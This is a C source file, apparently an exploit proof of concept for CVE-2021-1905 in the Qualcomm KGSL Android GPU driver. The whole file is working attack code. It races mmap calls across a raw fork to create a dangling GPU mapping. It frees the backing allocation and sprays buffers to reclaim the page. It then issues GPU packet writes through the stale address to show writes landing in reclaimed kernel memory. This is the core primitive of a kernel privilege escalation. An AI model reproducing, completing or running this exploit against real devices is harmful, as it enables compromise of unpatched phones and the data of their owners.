/*
 * kgsl_race_reclaim.c - CVE-2021-1905: race win -> free -> page reclaim test
 *   win -> MAGIC_A -> free entry -> spray SPRAY x 0x3000 bufs w/ MAGIC_B
 *   -> probe dangling VAs for MAGIC_B (reclaim hit?)
 *   -> if hit: GPU-write MAGIC_C via dangling VA, scan sprayed bufs CPU-side
 *      for MAGIC_C (proves GPU write lands in kernel-reclaimed page)
 *
 * Build: zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding -fno-builtin -O2 -Wl,-e,_start -o kgsl_race_reclaim kgsl_race_reclaim.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
#define SYS_munmap 215
#define SYS_wait4 260
#define SYS_sched_yield 124
static inline s64 sys1(long n,s64 a){register s64 x0 __asm__("x0")=a;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x8):"memory");return x0;}
static inline s64 sys2(long n,s64 a,s64 b){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x8):"memory");return x0;}
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_drawctxt_create{u32 flags;u32 drawctxt_id;};
#define IOCTL_DRAWCTXT_CREATE IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x13,sizeof(struct kgsl_drawctxt_create))
struct kgsl_gpumem_alloc_id{u32 id;u32 flags;u64 size;u64 mmapsize;u64 gpuaddr;u64 pad[2];};
#define IOCTL_GPUMEM_ALLOC_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x34,sizeof(struct kgsl_gpumem_alloc_id))
struct kgsl_gpumem_free_id{u32 id;u32 pad;};
#define IOCTL_GPUMEM_FREE_ID IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x35,sizeof(struct kgsl_gpumem_free_id))
struct kgsl_gpumem_get_info{u64 gpuaddr;u32 id;u32 flags;u64 size;u64 mmapsize;u64 useraddr;u32 lock;u32 pad[2];};
#define IOCTL_GPUMEM_GET_INFO IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x36,sizeof(struct kgsl_gpumem_get_info))
struct kgsl_command_object{u64 offset;u64 gpuaddr;u64 size;u32 flags;u32 id;};
struct kgsl_gpu_command{u64 flags;u64 cmdlist;u32 cmdsize;u32 numcmds;u64 objlist;u32 objsize;u32 numobjs;u64 synclist;u32 syncsize;u32 numsyncs;u32 context_id;u32 timestamp;};
#define IOCTL_GPU_COMMAND IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x4A,sizeof(struct kgsl_gpu_command))
#define KGSL_CMDLIST_IB 0x1u
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ull
#define CP_WAIT_REG_MEM 0x3cu
#define CP_MEM_WRITE 0x3du
#define ASZ 0x3000ull
#define SPRAY 512
#define MAXB 1024
#ifndef ROUNDS
#define ROUNDS 40
#endif

static u32 parity(u32 v){v^=v>>4;v^=v>>8;v^=v>>12;v^=v>>16;v^=v>>20;v^=v>>24;v^=v>>28;return (0x9669u>>(v&0xf))&1u;}
static u32 pkt7(u32 op,u32 cnt){return 0x70000000u|(cnt&0x3fffu)|(parity(cnt)<<15)|((op&0x7fu)<<16)|(parity(op)<<23);}
static void dc_civac(void*p,u64 len){u64 a=(u64)p&~63ull,b=((u64)p+len+63)&~63ull;for(;a<b;a+=64)asm volatile("dc civac, %0"::"r"(a):"memory");asm volatile("dsb ish":::"memory");}

static long g_fd; static u32 g_aid; static u64 g_fsz, g_h1, g_h2, g_h3;
static volatile u64* g_shm;
static char g_stack[0x8000] __attribute__((aligned(16), used));
static long g_p_res, g_c_res;

static u32 g_cmdid, g_outid; static u64 g_cmd_gpu,g_out_gpu; static u32*g_cmd; static u32*g_out;
static struct {u32 id;} g_ctx[3];
static u32 g_ts=1;
static u32 g_bids[MAXB]; static u32*g_bcpu[MAXB]; static u64 g_bgpu[MAXB]; static int g_nb;

static long alloc_buf(u64 size,u32 flags,u32*id,u64*gpu,u32**cpu){
    struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
    a.size=size; a.flags=flags;
    long r=sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
    if(r) return r;
    *id=a.id; *gpu=a.gpuaddr; u64 mz=a.mmapsize?a.mmapsize:size;
    s64 m=sys6(SYS_mmap,0,mz,3,1,g_fd,(s64)((u64)a.id<<12));
    if(m<=0) return -1;
    *cpu=(u32*)m; return 0;
}
static void make_ctx(int i){
    struct kgsl_drawctxt_create d; d.flags=0x1012u; d.drawctxt_id=0;
    sys3(SYS_ioctl,g_fd,IOCTL_DRAWCTXT_CREATE,(s64)&d);
    g_ctx[i].id=d.drawctxt_id;
}
static s64 alloc_a(void){
    struct kgsl_gpumem_alloc_id a; for(u64 i=0;i<sizeof(a);i++)((u8*)&a)[i]=0;
    a.size=ASZ; a.flags=(u32)KGSL_MEMFLAGS_USE_CPU_MAP;
    long r=sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_ALLOC_ID,(s64)&a);
    if(r) return r;
    g_aid=a.id; g_fsz=a.mmapsize?a.mmapsize:ASZ;
    return 0;
}
void child_entry(void) __attribute__((used));
static __attribute__((naked)) long raw_fork(void){
    __asm__ volatile(
        "mov x0, #17\n"
        "adrp x1, g_stack\n"
        "add x1, x1, #:lo12:g_stack\n"
        "add x1, x1, #0x8000\n"
        "mov x2, xzr\n""mov x3, xzr\n""mov x4, xzr\n""mov x8, #220\n""svc #0\n"
        "cbnz x0, 1f\n""bl child_entry\n""mov x0, #0\n""mov x8, #93\n""svc #0\n""1: ret\n");
}
void child_entry(void){
    g_shm[0]=1;
    while(g_shm[1]==0){}
    s64 m=sys6(SYS_mmap,(s64)g_h3,g_fsz,3,1,g_fd,(s64)((u64)g_aid<<12));
    g_shm[2]=(u64)m;
    sys1(SYS_exit,0);
}
static int submit_wait(int i,u32*cmd,u32 n,u32 expect_marker){
    dc_civac(cmd,n*4);
    g_out[i]=0; dc_civac(g_out,64);
    struct kgsl_command_object co; co.offset=0; co.gpuaddr=g_cmd_gpu; co.size=n*4; co.flags=KGSL_CMDLIST_IB; co.id=g_cmdid;
    struct kgsl_gpu_command gc; for(u64 q=0;q<sizeof(gc);q++)((u8*)&gc)[q]=0;
    gc.cmdlist=(u64)&co; gc.cmdsize=sizeof(co); gc.numcmds=1; gc.context_id=g_ctx[i].id; gc.timestamp=++g_ts;
    long r=sys3(SYS_ioctl,g_fd,IOCTL_GPU_COMMAND,(s64)&gc);
    if(r) return -1;
    for(int q=0;q<3000;q++){ dc_civac(g_out,64); if(g_out[i]==expect_marker) return 1; sys3(SYS_sched_yield,0,0,0); }
    return 0;
}
static int probe(int i,u64 addr,u32 ref){
    u32 k=0;
    g_cmd[k++]=pkt7(CP_WAIT_REG_MEM,6); g_cmd[k++]=0x13; g_cmd[k++]=(u32)addr; g_cmd[k++]=(u32)(addr>>32); g_cmd[k++]=ref; g_cmd[k++]=0xFFFFFFFFu; g_cmd[k++]=0x1;
    g_cmd[k++]=pkt7(CP_MEM_WRITE,3); g_cmd[k++]=(u32)(g_out_gpu+i*4); g_cmd[k++]=(u32)((g_out_gpu+i*4)>>32); g_cmd[k++]=0x600D0000u+(u32)i;
    return submit_wait(i,g_cmd,k,0x600D0000u+(u32)i);
}
static int gpu_write(int i,u64 addr,u32 val){
    u32 k=0;
    g_cmd[k++]=pkt7(CP_MEM_WRITE,3); g_cmd[k++]=(u32)addr; g_cmd[k++]=(u32)(addr>>32); g_cmd[k++]=val;
    g_cmd[k++]=pkt7(CP_MEM_WRITE,3); g_cmd[k++]=(u32)(g_out_gpu+i*4); g_cmd[k++]=(u32)((g_out_gpu+i*4)>>32); g_cmd[k++]=0x600D0000u+(u32)i;
    return submit_wait(i,g_cmd,k,0x600D0000u+(u32)i);
}
void _start(void){
    out("[*] kgsl_race_reclaim (race -> free -> spray ");outdec(SPRAY);out(" bufs)\n");
    g_fd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    out("[1] open = ");outdec(g_fd);out("\n");
    if(g_fd<0){sys3(SYS_exit,1,0,0);return;}
    make_ctx(0); make_ctx(1); make_ctx(2);
    if(alloc_buf(0x1000,0,&g_cmdid,&g_cmd_gpu,&g_cmd)){out("[!] cmd\n");sys3(SYS_exit,1,0,0);return;}
    if(alloc_buf(0x1000,0,&g_outid,&g_out_gpu,&g_out)){out("[!] out\n");sys3(SYS_exit,1,0,0);return;}
    for(int i=0;i<64;i++) g_out[i]=0; dc_civac(g_out,256);

    int wins=0;
    for(int round=1; round<=ROUNDS; round++){
        if(alloc_a()) break;
        g_h1=0x60000000ull + (u64)(round&0x1f)*0x10000ull;
        g_h2=0x70000000ull + (u64)(round&0x1f)*0x10000ull;
        g_h3=0x50000000ull + (u64)(round&0x1f)*0x10000ull;
        s64 m1=sys6(SYS_mmap,(s64)g_h1,g_fsz,3,1,g_fd,(s64)((u64)g_aid<<12));
        if(m1<=0){ struct kgsl_gpumem_free_id f; f.id=g_aid; f.pad=0; sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f); continue; }
        g_h1=(u64)m1;
        sys2(SYS_munmap,(s64)(g_h1+0x1000),0x1000);
        sys2(SYS_munmap,(s64)(g_h1+0x2000),(s64)(g_fsz-0x2000));

        g_shm=(volatile u64*)sys6(SYS_mmap,0,0x1000,3,0x21,-1,0);
        g_shm[0]=0; g_shm[1]=0; g_shm[2]=0;
        long pid=raw_fork();
        if(pid>0){
            while(g_shm[0]==0){}
            g_shm[1]=1;
            g_p_res=sys6(SYS_mmap,(s64)g_h2,g_fsz,3,1,g_fd,(s64)((u64)g_aid<<12));
            sys4(SYS_wait4,pid,0,0,0);
            g_c_res=(s64)g_shm[2];
            if(g_p_res>0 && g_c_res>0){
                wins++;
                out("[R");outdec(round);out("] WIN parent=");outhex((u64)g_p_res);out(" child=");outhex((u64)g_c_res);out(" (cleanup, continue)\n");
                sys2(SYS_munmap,(s64)g_p_res,g_fsz);
                sys2(SYS_munmap,(s64)g_h1,0x1000);
                struct kgsl_gpumem_free_id fw; fw.id=g_aid; fw.pad=0;
                sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&fw);
                continue;
            } else if((g_p_res>0) != (g_c_res>0)){
                out("[R");outdec(round);out("] MIXED parent=");outhex((u64)g_p_res);out(" child=");outhex((u64)g_c_res);out("\n");
                if(g_c_res>0){
                    /* child survivor, parent's error path ran: P0 primitive candidate */
                    u64 surv=(u64)g_c_res;
                    int w=gpu_write(2,surv+0x100,0xDEADBEEFu);
                    int v=probe(0,surv+0x100,0xDEADBEEFu);
                    out("[R");outdec(round);out("] child-survivor PTE check gpu_write=");outdec(w);out(" gpu_read=");outdec(v);out("\n");
                    /* destroy survivor entry: close start VMA + free id */
                    sys2(SYS_munmap,(s64)g_h1,0x1000);
                    struct kgsl_gpumem_free_id f3; f3.id=g_aid; f3.pad=0;
                    long fr3=sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f3);
                    struct kgsl_gpumem_get_info gi3; for(u64 q=0;q<sizeof(gi3);q++)((u8*)&gi3)[q]=0; gi3.id=g_aid;
                    long gr3=sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_GET_INFO,(s64)&gi3);
                    out("[R");outdec(round);out("] destroy: free_id rc=");outdec(fr3);out(" get_info rc=");outdec(gr3);out("\n");
                    /* spray + reclaim probe at survivor VA */
                    g_nb=0;
                    for(int q=0;q<SPRAY;q++){ u32 id; u64 gpu; u32*cp;
                        if(alloc_buf(ASZ,0,&id,&gpu,&cp)) break;
                        for(u64 w2=0;w2<ASZ/4;w2++) cp[w2]=0xB6B6B6B6u; dc_civac(cp,ASZ);
                        if(g_nb<MAXB){ g_bids[g_nb]=id; g_bgpu[g_nb]=gpu; g_bcpu[g_nb]=cp; g_nb++; }
                    }
                    out("[R");outdec(round);out("] sprayed ");outdec(g_nb);out("\n");
                    int ra=probe(1,surv+0x100,0xB6B6B6B6u);
                    out("[R");outdec(round);out("] reclaim probe survivorVA=");outdec(ra);
                    out(ra==1?"  <== DANGLING PTE + PAGE RECLAIM LIVE\n":"  (no reclaim)\n");
                    if(ra==1){
                        int w2=gpu_write(2,surv+0x100,0xCAFEF00Du);
                        out("[R");outdec(round);out("] gpu_write rc=");outdec(w2);out(" scanning bufs\n");
                        int found=-1;
                        for(int q=0;q<g_nb;q++){ u32*p=g_bcpu[q];
                            for(u64 w3=0;w3<ASZ/4;w3++){ if(p[w3]==0xCAFEF00Du){ found=q; break; } }
                            if(found>=0) break; }
                        out("[R");outdec(round);out("] alias buf=");outdec(found);
                        out(found>=0?"  <== GPU WRITE INTO RECLAIMED KERNEL PAGE\n":"\n");
                    }
                    break;
                }
                /* parent survivor: child's failed mmap; survivor mapping intact */
                if(g_p_res>0){
                    u32*pm=(u32*)g_p_res;
                    for(u64 q=0;q<g_fsz/4;q++) pm[q]=0xA5A5A5A5u; dc_civac(pm,g_fsz);
                    int sv=probe(0,(u64)g_p_res+0x100,0xA5A5A5A5u);
                    out("[R");outdec(round);out("] survivor GPU probe=");outdec(sv);out(sv==0?"  <== SURVIVOR GPU MAPPING DESTROYED\n":"  (survivor mapping intact)\n");
                    sys2(SYS_munmap,(s64)g_p_res,g_fsz);
                }
                sys2(SYS_munmap,(s64)g_h1,0x1000);
                struct kgsl_gpumem_free_id f4; f4.id=g_aid; f4.pad=0;
                sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f4);
                continue;
            }
            if(g_p_res>0) sys2(SYS_munmap,(s64)g_p_res,g_fsz);
        } else {
            out("[!] fork failed\n"); break;
        }
        sys2(SYS_munmap,(s64)g_h1,0x1000);
        struct kgsl_gpumem_free_id f2; f2.id=g_aid; f2.pad=0;
        sys3(SYS_ioctl,g_fd,IOCTL_GPUMEM_FREE_ID,(s64)&f2);
    }
    out("[*] done: wins=");outdec(wins);out("\n");
    sys3(SYS_close,g_fd,0,0);
    sys3(SYS_exit,0,0,0);
}
